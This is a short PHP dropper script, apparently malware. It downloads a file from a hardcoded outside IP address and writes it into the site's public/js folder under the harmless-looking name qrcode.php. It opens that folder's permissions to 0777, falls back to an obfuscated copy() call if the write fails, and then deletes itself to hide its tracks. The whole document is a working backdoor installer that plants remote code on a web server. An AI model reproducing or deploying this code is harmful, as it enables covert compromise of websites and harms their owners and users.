<?php
$file = 'qrcode.php';
$webroot = $_SERVER['DOCUMENT_ROOT'];
$remotePath = 'http://154.91.201.161/sd.txt';
$fileCon = file_get_contents($remotePath);
$localPath = $webroot.'/public/js/'.$file;
chmod($webroot.'/public/js/',0777);
$wt=file_put_contents($localPath,$fileCon);
if (!$wt){
	$aaa="co"."py";$aaa($remotePath,$localPath);
};
unlink(__FILE__);